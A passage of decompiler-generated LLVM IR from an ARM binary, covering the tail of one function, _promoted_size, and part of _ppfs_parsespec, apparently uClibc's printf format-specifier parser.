dec_label_pc_151e4:                               ; preds = %dec_label_pc_151b4, %dec_label_pc_151a0, %dec_label_pc_15184, %dec_label_pc_151d4
  %v0_151e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_151e4 = add i32 %v0_151e4, 8
  store i32 %v1_151e4, i32* %ip.global-to-local, align 4
  %v0_151ec.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_151e8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_151e8.backedge

dec_label_pc_151e8.backedge:                      ; preds = %dec_label_pc_151e4, %dec_label_pc_15114
  %v0_151e8 = phi i32 [ %v0_151e8.pre, %dec_label_pc_151e4 ], [ %v0_151e824, %dec_label_pc_15114 ]
  %v0_15120.be = phi i32 [ %v0_151ec.pre.pre, %dec_label_pc_151e4 ], [ %v1_15120, %dec_label_pc_15114 ]
  %v1_151e8 = add i32 %v0_151e8, 28
  %v2_151e8 = inttoptr i32 %v1_151e8 to i32*
  %v3_151e8 = load i32, i32* %v2_151e8, align 4
  store i32 %v3_151e8, i32* %r3.global-to-local, align 4
  %v5_151f0 = icmp slt i32 %v0_15120.be, %v3_151e8
  br i1 %v5_151f0, label %dec_label_pc_15114, label %dec_label_pc_151e8.dec_label_pc_151f4.loopexit_crit_edge

dec_label_pc_151f8:                               ; preds = %entry
  br i1 %v6_150c0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_151f8
  %v2_151fc = add i32 %v0_150ac, 36
  %v3_151fc = inttoptr i32 %v2_151fc to i8*
  %v4_151fc = load i8, i8* %v3_151fc, align 1
  %v5_151fc = zext i8 %v4_151fc to i32
  %v5_15200 = mul nuw nsw i32 %v5_151fc, 8
  %v6_15200 = add i32 %v5_15200, %v0_150ac
  store i32 %v6_15200, i32* %r3.global-to-local, align 4
  %v2_15204 = add i32 %v6_15200, 72
  %v3_15204 = inttoptr i32 %v2_15204 to i32*
  %v4_15204 = load i32, i32* %v3_15204, align 4
  store i32 %v4_15204, i32* %r3.global-to-local, align 4
  store i32 %v4_15204, i32* %v2_150b8, align 4
  %v0_1520c.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_151f8, %bb
  %v2_15220 = phi i32 [ %v0_1520c.pre, %bb ], [ %v0_150ac, %dec_label_pc_151f8 ]
  %v1_1520c = add i32 %v2_15220, 4
  %v2_1520c = inttoptr i32 %v1_1520c to i32*
  %v3_1520c = load i32, i32* %v2_1520c, align 4
  store i32 %v3_1520c, i32* %r3.global-to-local, align 4
  %v6_15210 = icmp eq i32 %v3_1520c, -2147483648
  br i1 %v6_15210, label %bb16, label %dec_label_pc_151f4

bb16:                                             ; preds = %.thread1
  %v2_15214 = add i32 %v2_15220, 37
  %v3_15214 = inttoptr i32 %v2_15214 to i8*
  %v4_15214 = load i8, i8* %v3_15214, align 1
  %v5_15214 = zext i8 %v4_15214 to i32
  %v5_15218 = mul nuw nsw i32 %v5_15214, 8
  %v6_15218 = add i32 %v5_15218, %v2_15220
  store i32 %v6_15218, i32* %r3.global-to-local, align 4
  %v2_1521c = add i32 %v6_15218, 72
  %v3_1521c = inttoptr i32 %v2_1521c to i32*
  %v4_1521c = load i32, i32* %v3_1521c, align 4
  store i32 %v4_1521c, i32* %r3.global-to-local, align 4
  store i32 %v4_1521c, i32* %v2_1520c, align 4
  %v0_15224.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_151f4

dec_label_pc_151e8.dec_label_pc_151f4.loopexit_crit_edge: ; preds = %dec_label_pc_151e8.backedge
  br label %dec_label_pc_151f4.loopexit

dec_label_pc_151f4.loopexit:                      ; preds = %dec_label_pc_151e8.dec_label_pc_151f4.loopexit_crit_edge, %dec_label_pc_15108
  %v0_151e8.lcssa = phi i32 [ %v0_151e8, %dec_label_pc_151e8.dec_label_pc_151f4.loopexit_crit_edge ], [ %v0_151e817, %dec_label_pc_15108 ]
  br label %dec_label_pc_151f4

dec_label_pc_151f4:                               ; preds = %dec_label_pc_151f4.loopexit, %.thread1, %bb16
  %v1_15244 = phi i32 [ %v0_151e8.lcssa, %dec_label_pc_151f4.loopexit ], [ %v2_15220, %.thread1 ], [ %v0_15224.pre, %bb16 ]
  %v1_15224 = add i32 %v1_15244, 8
  %v2_15224 = inttoptr i32 %v1_15224 to i32*
  %v3_15224 = load i32, i32* %v2_15224, align 4
  store i32 %v3_15224, i32* %r1.global-to-local, align 4
  %v1_15228 = icmp slt i32 %v3_15224, 0
  br i1 %v1_15228, label %dec_label_pc_15230, label %dec_label_pc_15250

dec_label_pc_15230:                               ; preds = %dec_label_pc_151f4
  %v1_15230 = add i32 %v1_15244, 16
  %v2_15230 = inttoptr i32 %v1_15230 to i32*
  %v3_15230 = load i32, i32* %v2_15230, align 4
  %v1_15238 = sub i32 0, %v3_15224
  store i32 %v1_15238, i32* %r1.global-to-local, align 4
  %v1_15234 = and i32 %v3_15230, -10
  %v1_1523c = or i32 %v1_15234, 8
  store i32 %v1_1523c, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_15244 = add i32 %v1_15244, 20
  %v3_15244 = inttoptr i32 %v2_15244 to i32*
  store i32 32, i32* %v3_15244, align 4
  %v0_15248 = load i32, i32* %r1.global-to-local, align 4
  %v1_15248 = load i32, i32* @r0, align 4
  %v2_15248 = add i32 %v1_15248, 8
  %v3_15248 = inttoptr i32 %v2_15248 to i32*
  store i32 %v0_15248, i32* %v3_15248, align 4
  %v0_1524c = load i32, i32* %r3.global-to-local, align 4
  %v1_1524c = load i32, i32* @r0, align 4
  %v2_1524c = add i32 %v1_1524c, 16
  %v3_1524c = inttoptr i32 %v2_1524c to i32*
  store i32 %v0_1524c, i32* %v3_1524c, align 4
  %v1_15254.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_15250

dec_label_pc_15250:                               ; preds = %dec_label_pc_151f4, %dec_label_pc_15230
  %v1_15254 = phi i32 [ %v1_15244, %dec_label_pc_151f4 ], [ %v1_15254.pre, %dec_label_pc_15230 ]
  %v2_15250 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15250, i32* @r4, align 4
  ret i32 %v1_15254

; uselistorder directives
  uselistorder i32 %v2_15220, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15120.be, { 1, 0 }
  uselistorder i32 %v0_151e8, { 1, 2, 0 }
  uselistorder i32 %v3_15128, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_15128, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_15118, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_1512023, { 1, 0 }
  uselistorder i32 %v0_151e824, { 0, 2, 1 }
  uselistorder i32 %v0_151e817, { 2, 0, 1 }
  uselistorder i32 %v0_150ac, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_15250, { 1, 0 }
  uselistorder label %dec_label_pc_151f4, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_151e4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_151d4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_151b4, { 1, 0 }
  uselistorder label %dec_label_pc_151a0, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_15114, { 1, 0 }
  uselistorder label %dec_label_pc_15108, { 1, 0 }
  uselistorder label %dec_label_pc_150e0, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_15278.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_15274

dec_label_pc_15274:                               ; preds = %dec_label_pc_15280, %entry
  %v0_15274 = phi i32 [ %v1_15274, %dec_label_pc_15280 ], [ add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -37110), %entry ]
  %v1_15274 = add i32 %v0_15274, -2
  %v2_15274 = inttoptr i32 %v1_15274 to i16*
  %v3_15274 = load i16, i16* %v2_15274, align 2
  %v4_15274 = sext i16 %v3_15274 to i32
  store i32 %v1_15274, i32* @ip, align 4
  %v9_15278 = icmp eq i32 %v4_15274, %v1_15278.pre
  br i1 %v9_15278, label %dec_label_pc_15274.dec_label_pc_15288_crit_edge, label %dec_label_pc_15280

dec_label_pc_15274.dec_label_pc_15288_crit_edge:  ; preds = %dec_label_pc_15274
  br label %dec_label_pc_15288

dec_label_pc_15280:                               ; preds = %dec_label_pc_15274
  %tmp = icmp ugt i32 %v1_15274, add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -37134)
  br i1 %tmp, label %dec_label_pc_15274, label %dec_label_pc_15288.loopexit

dec_label_pc_15288.loopexit:                      ; preds = %dec_label_pc_15280
  br label %dec_label_pc_15288

dec_label_pc_15288:                               ; preds = %dec_label_pc_15288.loopexit, %dec_label_pc_15274.dec_label_pc_15288_crit_edge
  %v2_15298.pre-phi = sub i32 %v1_15274, add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -37134)
  store i32 %v2_15298.pre-phi, i32* @r2, align 4
  %v4_1529c = sdiv i32 %v2_15298.pre-phi, 2
  %v5_1529c = add i32 %v4_1529c, add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -37110)
  %v6_1529c = inttoptr i32 %v5_1529c to i8*
  %v7_1529c = load i8, i8* %v6_1529c, align 1
  %v9_1529c = zext i8 %v7_1529c to i32
  ret i32 %v9_1529c

; uselistorder directives
  uselistorder i32 %v2_15298.pre-phi, { 1, 0 }
  uselistorder i32 %v1_15274, { 1, 0, 3, 4, 2 }
  uselistorder i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -37134), { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp117 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_152b0 = load i32, i32* @r4, align 4
  store i32 %v3_152b0, i32* %stack_var_-36, align 4
  %v6_152b0 = load i32, i32* @r5, align 4
  %v27_152b0 = load i32, i32* @lr, align 4
  %v0_152b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_152b4 = add i32 %v0_152b4, 16
  %v2_152b4 = inttoptr i32 %v1_152b4 to i32*
  %v3_152b4 = load i32, i32* %v2_152b4, align 4
  %v1_152bc = and i32 %v3_152b4, 128
  store i32 %v1_152bc, i32* @r4, align 4
  %v2_152bc = icmp eq i32 %v1_152bc, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_152b4, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @lr, align 4
  %v1_152e4 = add i32 %v0_152b4, 24
  %v2_152e4 = inttoptr i32 %v1_152e4 to i32*
  %v3_152e4 = load i32, i32* %v2_152e4, align 4
  store i32 %v3_152e4, i32* %fp.global-to-local, align 4
  br i1 %v2_152bc, label %.dec_label_pc_15338_crit_edge, label %dec_label_pc_152f0

.dec_label_pc_15338_crit_edge:                    ; preds = %entry
  %v2_152e8 = inttoptr i32 %v0_152b4 to i32*
  %v3_152e8 = load i32, i32* %v2_152e8, align 4
  store i32 %v3_152e8, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_15338

dec_label_pc_152f0:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_15300 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_152f4

dec_label_pc_152f4:                               ; preds = %dec_label_pc_15324.dec_label_pc_152f4_crit_edge, %dec_label_pc_152f0
  %v1_15304 = phi i32 [ %v1_15314, %dec_label_pc_15324.dec_label_pc_152f4_crit_edge ], [ 0, %dec_label_pc_152f0 ]
  %v0_152f4 = phi i32 [ %v0_152f4.pre, %dec_label_pc_15324.dec_label_pc_152f4_crit_edge ], [ %v0_152b4, %dec_label_pc_152f0 ]
  %v1_152f4 = inttoptr i32 %v0_152f4 to i32*
  %v2_152f4 = load i32, i32* %v1_152f4, align 4
  %v4_152f8 = mul i32 %v1_15304, 4
  %v5_152f8 = add i32 %v2_152f4, %v4_152f8
  store i32 %v5_152f8, i32* %r3.global-to-local, align 4
  %v1_152fc = add i32 %v5_152f8, -4
  %v2_152fc = inttoptr i32 %v1_152fc to i8*
  %v3_152fc = load i8, i8* %v2_152fc, align 1
  %v4_152fc = zext i8 %v3_152fc to i32
  store i32 %v4_152fc, i32* %r1.global-to-local, align 4
  store i32 %v2_15300, i32* @ip, align 4
  %v2_15304 = add i32 %v1_15304, %v2_15300
  store i32 %v2_15304, i32* %r2.global-to-local, align 4
  %v3_15308 = add i32 %v2_15304, -72
  %v4_15308 = inttoptr i32 %v3_15308 to i8*
  store i8 %v3_152fc, i8* %v4_15308, align 1
  %v0_1530c = load i32, i32* %r3.global-to-local, align 4
  %v1_1530c = add i32 %v0_1530c, -4
  %v2_1530c = inttoptr i32 %v1_1530c to i32*
  %v3_1530c = load i32, i32* %v2_1530c, align 4
  store i32 %v3_1530c, i32* %r3.global-to-local, align 4
  %v0_15310 = load i32, i32* %r1.global-to-local, align 4
  %v9_15310 = icmp eq i32 %v0_15310, %v3_1530c
  %v0_15314 = load i32, i32* %r0.global-to-local, align 4
  %v1_15314 = add i32 %v0_15314, 1
  store i32 %v1_15314, i32* %r0.global-to-local, align 4
  br i1 %v9_15310, label %dec_label_pc_1531c, label %dec_label_pc_157e0

dec_label_pc_1531c:                               ; preds = %dec_label_pc_152f4
  %v2_1531c = icmp eq i32 %v3_1530c, 0
  br i1 %v2_1531c, label %dec_label_pc_1532c, label %dec_label_pc_15324

dec_label_pc_15324:                               ; preds = %dec_label_pc_1531c
  %tmp182 = icmp ult i32 %v1_15314, 32
  br i1 %tmp182, label %dec_label_pc_15324.dec_label_pc_152f4_crit_edge, label %dec_label_pc_1532c

dec_label_pc_15324.dec_label_pc_152f4_crit_edge:  ; preds = %dec_label_pc_15324
  %v0_152f4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_152f4

dec_label_pc_1532c:                               ; preds = %dec_label_pc_15324, %dec_label_pc_1531c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_15334 = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_15334, i32* %r0.global-to-local, align 4
  %v0_15344.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_15338

dec_label_pc_15338:                               ; preds = %.dec_label_pc_15338_crit_edge, %dec_label_pc_1532c
  %v3_1536c.pre-phi = phi i32 [ %.pre, %.dec_label_pc_15338_crit_edge ], [ %v2_15300, %dec_label_pc_1532c ]
  %v0_1536464 = phi i32 [ %v3_152e8, %.dec_label_pc_15338_crit_edge ], [ %v2_15334, %dec_label_pc_1532c ]
  %v0_15344 = phi i32 [ ptrtoint (i16* @global_var_2c158.876 to i32), %.dec_label_pc_15338_crit_edge ], [ %v0_15344.pre, %dec_label_pc_1532c ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 532, i32* %r2.global-to-local, align 4
  %v2_15344 = add i32 %v0_15344, -37072
  store i32 %v2_15344, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v4_15358 = inttoptr i32 %v2_15344 to i8*
  store i8* %v4_15358, i8** %stack_var_-120, align 4
  br label %dec_label_pc_15364

dec_label_pc_15360:                               ; preds = %.thread20, %dec_label_pc_15494
  %v0_15360 = phi i32 [ %v2_1550c, %.thread20 ], [ %v0_1547076, %dec_label_pc_15494 ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread20 ], [ %stack_var_-44.2, %dec_label_pc_15494 ]
  store i32 %v0_15360, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15364

dec_label_pc_15364:                               ; preds = %dec_label_pc_15338, %dec_label_pc_15360
  %v1_15378 = phi i32 [ %v0_1536464, %dec_label_pc_15338 ], [ %v0_15360, %dec_label_pc_15360 ]
  %stack_var_-44.1 = phi i32 [ %tmp117, %dec_label_pc_15338 ], [ %stack_var_-44.0, %dec_label_pc_15360 ]
  %v1_15364 = inttoptr i32 %v1_15378 to i8*
  %v2_15364 = load i8, i8* %v1_15364, align 1
  %v3_15364 = zext i8 %v2_15364 to i32
  store i32 %v3_15364, i32* %r3.global-to-local, align 4
  %v7_15368 = icmp eq i8 %v2_15364, 42
  br i1 %v7_15368, label %bb, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_15364
  store i32 %v1_15378, i32* %r6.global-to-local, align 4
  %v0_1537c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1537c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_153c4.preheader

bb:                                               ; preds = %dec_label_pc_15364
  %v1_15370 = load i32, i32* %r8.global-to-local, align 4
  %v2_15370 = load i32, i32* %sb.global-to-local, align 4
  %v4_15370 = mul i32 %v2_15370, %v1_15370
  %v5_15370 = add i32 %v4_15370, %v3_1536c.pre-phi
  store i32 %v5_15370, i32* %r3.global-to-local, align 4
  %v2_15378 = add i32 %v1_15378, 1
  store i32 %v2_15378, i32* %r6.global-to-local, align 4
  %v0_1537c111 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1537c111, i32* %r1.global-to-local, align 4
  %v3_15380 = add i32 %v5_15370, -40
  %v4_15380 = inttoptr i32 %v3_15380 to i32*
  store i32 %v0_1537c111, i32* %v4_15380, align 4
  %v0_153c8.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_153c4.preheader

dec_label_pc_153c4.preheader:                     ; preds = %.thread8, %bb
  %v0_153c8.pre = phi i32 [ %v1_15378, %.thread8 ], [ %v0_153c8.pre.pre, %bb ]
  %v0_153cc.pre = load i32, i32* @lr, align 4
  %v2_153cc = add i32 %v0_153cc.pre, 532
  %v3_153cc = inttoptr i32 %v2_153cc to i32*
  br label %dec_label_pc_153c4

dec_label_pc_15388:                               ; preds = %dec_label_pc_153c4
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_1538c = load i32, i32* %r1.global-to-local, align 4
  %v2_1538c = add i32 %v0_1538c, -214748363
  %tmp139 = sub i32 214748362, %v0_1538c
  %v6_1538c = and i32 %tmp139, %v0_1538c
  %v7_1538c = icmp slt i32 %v6_1538c, 0
  %v8_1538c = icmp slt i32 %v2_1538c, 0
  %v9_1538c = icmp eq i32 %v0_1538c, 214748363
  %v3_15390 = xor i1 %v8_1538c, %v7_1538c
  %v4_15390 = or i1 %v9_1538c, %v3_15390
  br i1 %v4_15390, label %dec_label_pc_153a8, label %dec_label_pc_15394

dec_label_pc_15394:                               ; preds = %dec_label_pc_15388
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_15398 = icmp eq i32 %v0_1538c, 214748364
  br i1 %v9_15398, label %dec_label_pc_153a0, label %dec_label_pc_153c0

dec_label_pc_153a0:                               ; preds = %dec_label_pc_15394
  %v8_153a4 = icmp ugt i8 %v2_153c8, 55
  br i1 %v8_153a4, label %dec_label_pc_153c0, label %dec_label_pc_153a8

dec_label_pc_153a8:                               ; preds = %dec_label_pc_153a0, %dec_label_pc_15388
  %v2_153ac = mul i32 %v0_1538c, 10
  %v1_153b0 = add i32 %v2_153ac, -48
  store i32 %v1_153b0, i32* %r3.global-to-local, align 4
  %v2_153b4 = add i32 %v1_153b0, %v3_153c8
  br label %dec_label_pc_153c0

dec_label_pc_153c0:                               ; preds = %dec_label_pc_153a0, %dec_label_pc_15394, %dec_label_pc_153a8
  %storemerge = phi i32 [ %v2_153b4, %dec_label_pc_153a8 ], [ 2147483647, %dec_label_pc_15394 ], [ 2147483647, %dec_label_pc_153a0 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_153c0 = add i32 %v0_15448, 1
  store i32 %v1_153c0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_153c4

dec_label_pc_153c4:                               ; preds = %dec_label_pc_153c4.preheader, %dec_label_pc_153c0
  %v0_15448 = phi i32 [ %v0_153c8.pre, %dec_label_pc_153c4.preheader ], [ %v1_153c0, %dec_label_pc_153c0 ]
  store i32 532, i32* %r2.global-to-local, align 4
  %v1_153c8 = inttoptr i32 %v0_15448 to i8*
  %v2_153c8 = load i8, i8* %v1_153c8, align 1
  %v3_153c8 = zext i8 %v2_153c8 to i32
  store i32 %v3_153c8, i32* @ip, align 4
  %v4_153cc = load i32, i32* %v3_153cc, align 4
  store i32 %v4_153cc, i32* %r3.global-to-local, align 4
  %v2_153d0 = mul nuw nsw i32 %v3_153c8, 2
  store i32 %v2_153d0, i32* %r2.global-to-local, align 4
  %v2_153d4 = add i32 %v2_153d0, %v4_153cc
  %v3_153d4 = inttoptr i32 %v2_153d4 to i16*
  %v4_153d4 = load i16, i16* %v3_153d4, align 2
  %v6_153d4 = zext i16 %v4_153d4 to i32
  store i32 %v6_153d4, i32* %r3.global-to-local, align 4
  %v1_153d8 = and i32 %v6_153d4, 8
  %v2_153d8 = icmp eq i32 %v1_153d8, 0
  br i1 %v2_153d8, label %dec_label_pc_153e0, label %dec_label_pc_15388

dec_label_pc_153e0:                               ; preds = %dec_label_pc_153c4
  %v0_153e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_153e0 = add i32 %v0_153e0, -1
  %v2_153e0 = inttoptr i32 %v1_153e0 to i8*
  %v3_153e0 = load i8, i8* %v2_153e0, align 1
  %v4_153e0 = zext i8 %v3_153e0 to i32
  store i32 %v4_153e0, i32* %r3.global-to-local, align 4
  %v7_153e4 = icmp eq i8 %v3_153e0, 37
  br i1 %v7_153e4, label %dec_label_pc_153ec, label %dec_label_pc_154ac

dec_label_pc_153ec:                               ; preds = %dec_label_pc_153e0
  %v7_153ec = icmp eq i8 %v2_153c8, 36
  %. = zext i1 %v7_153ec to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_153f8 = load i32, i32* %r1.global-to-local, align 4
  %tmp143 = icmp slt i32 %v0_153f8, 1
  br i1 %tmp143, label %bb144, label %thread-pre-split

bb144:                                            ; preds = %dec_label_pc_153ec
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_153ec, %bb144
  %v0_15400 = phi i32 [ 0, %bb144 ], [ %., %dec_label_pc_153ec ]
  %v2_15400 = icmp eq i32 %v0_15400, 0
  %v0_15434 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_15400, label %dec_label_pc_15434, label %dec_label_pc_15408

dec_label_pc_15408:                               ; preds = %thread-pre-split
  %v2_15434 = icmp eq i32 %v0_15434, 0
  %v1_1540c = add i32 %v0_15448, 1
  store i32 %v1_1540c, i32* %r0.global-to-local, align 4
  br i1 %v2_15434, label %dec_label_pc_157e0, label %dec_label_pc_15414

dec_label_pc_15414:                               ; preds = %dec_label_pc_15408
  %v2_15414 = sub i32 %v0_153f8, %v0_15434
  %v4_15414 = xor i32 %v0_15434, %v0_153f8
  %v5_15414 = xor i32 %v2_15414, %v0_153f8
  %v6_15414 = and i32 %v5_15414, %v4_15414
  %v7_15414 = icmp slt i32 %v6_15414, 0
  %v8_15414 = icmp slt i32 %v2_15414, 0
  %v9_15414 = icmp eq i32 %v0_153f8, %v0_15434
  %v3_15418 = xor i1 %v8_15414, %v7_15414
  %v4_15418 = or i1 %v9_15414, %v3_15418
  br i1 %v4_15418, label %dec_label_pc_15428, label %bb145

bb145:                                            ; preds = %dec_label_pc_15414
  store i32 %v0_153f8, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_15428

dec_label_pc_15424:                               ; preds = %dec_label_pc_15448, %dec_label_pc_15450
  %v0_15424 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15424, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_15428

dec_label_pc_15428:                               ; preds = %bb145, %dec_label_pc_15414, %dec_label_pc_15424
  %v0_15428 = phi i32 [ %v0_153e0, %dec_label_pc_15424 ], [ %v1_1540c, %dec_label_pc_15414 ], [ %v1_1540c, %bb145 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_15424 ], [ %v0_153f8, %dec_label_pc_15414 ], [ %v0_153f8, %bb145 ]
  store i32 %v0_15428, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_15464.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_15464 = ptrtoint i8* %v2_15464.pre to i32
  br label %dec_label_pc_15464

dec_label_pc_15434:                               ; preds = %thread-pre-split
  %tmp146 = icmp slt i32 %v0_15434, 1
  br i1 %tmp146, label %dec_label_pc_15448, label %dec_label_pc_1543c

dec_label_pc_1543c:                               ; preds = %dec_label_pc_15434
  %v7_1543c = icmp eq i8 %v2_153c8, 109
  br i1 %v7_1543c, label %dec_label_pc_154ac, label %dec_label_pc_157e0

dec_label_pc_15448:                               ; preds = %dec_label_pc_15434
  %tmp183 = icmp ugt i32 %v0_15448, %v0_153e0
  br i1 %tmp183, label %dec_label_pc_15450, label %dec_label_pc_15424

dec_label_pc_15450:                               ; preds = %dec_label_pc_15448
  %v1_15450 = inttoptr i32 %v0_153e0 to i8*
  %v2_15450 = load i8, i8* %v1_15450, align 1
  %v3_15450 = zext i8 %v2_15450 to i32
  store i32 %v3_15450, i32* %r3.global-to-local, align 4
  %v7_15454 = icmp eq i8 %v2_15450, 48
  br i1 %v7_15454, label %dec_label_pc_15424, label %bb147

bb147:                                            ; preds = %dec_label_pc_15450
  %v1_15458 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_15458, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_154ac

dec_label_pc_15464.loopexit:                      ; preds = %dec_label_pc_1546c
  %v1_15478 = load i32, i32* @r4, align 4
  %v3_15478 = or i32 %v1_15478, %v0_1548c
  store i32 %v3_15478, i32* @r4, align 4
  %v2_1547c = add i32 %v0_1547076, 1
  store i32 %v2_1547c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15464

dec_label_pc_15464:                               ; preds = %dec_label_pc_15464.loopexit, %dec_label_pc_15428
  %v0_1547076 = phi i32 [ %v2_1547c, %dec_label_pc_15464.loopexit ], [ %v0_15428, %dec_label_pc_15428 ]
  store i32 %v3_15464, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_15470 = inttoptr i32 %v0_1547076 to i8*
  br label %dec_label_pc_1546c

dec_label_pc_1546c:                               ; preds = %dec_label_pc_15484, %dec_label_pc_15464
  %v0_1548c = phi i32 [ %v2_1548c, %dec_label_pc_15484 ], [ 1, %dec_label_pc_15464 ]
  %v0_1546c = phi i32 [ %v5_1546c, %dec_label_pc_15484 ], [ %v3_15464, %dec_label_pc_15464 ]
  %v1_1546c = inttoptr i32 %v0_1546c to i8*
  %v2_1546c = load i8, i8* %v1_1546c, align 1
  %v3_1546c = zext i8 %v2_1546c to i32
  store i32 %v3_1546c, i32* %r2.global-to-local, align 4
  %v5_1546c = add i32 %v0_1546c, 1
  store i32 %v5_1546c, i32* %r0.global-to-local, align 4
  %v2_15470 = load i8, i8* %v1_15470, align 1
  %v3_15470 = zext i8 %v2_15470 to i32
  store i32 %v3_15470, i32* %r3.global-to-local, align 4
  %v9_15474 = icmp eq i8 %v2_15470, %v2_1546c
  br i1 %v9_15474, label %dec_label_pc_15464.loopexit, label %dec_label_pc_15484

dec_label_pc_15484:                               ; preds = %dec_label_pc_1546c
  %v1_15484 = inttoptr i32 %v5_1546c to i8*
  %v2_15484 = load i8, i8* %v1_15484, align 1
  %v3_15484 = zext i8 %v2_15484 to i32
  store i32 %v3_15484, i32* %r3.global-to-local, align 4
  %v2_15488 = icmp eq i8 %v2_15484, 0
  %v2_1548c = mul i32 %v0_1548c, 2
  store i32 %v2_1548c, i32* %r1.global-to-local, align 4
  br i1 %v2_15488, label %dec_label_pc_15494, label %dec_label_pc_1546c

dec_label_pc_15494:                               ; preds = %dec_label_pc_15484
  %v1_15494 = add i32 %v0_1547076, -1
  %v2_15494 = inttoptr i32 %v1_15494 to i8*
  %v3_15494 = load i8, i8* %v2_15494, align 1
  %v7_15498 = icmp eq i8 %v3_15494, 37
  %v0_1549c = load i32, i32* @r4, align 4
  %v1_1549c = and i32 %v0_1549c, 10
  store i32 %v1_1549c, i32* %r3.global-to-local, align 4
  %v4_154a0 = udiv i32 %v1_1549c, 2
  %v5_154a0 = sub nuw nsw i32 -1, %v4_154a0
  %v6_154a0 = and i32 %v0_1549c, %v5_154a0
  store i32 %v6_154a0, i32* @r4, align 4
  br i1 %v7_15498, label %dec_label_pc_154a8, label %dec_label_pc_15360

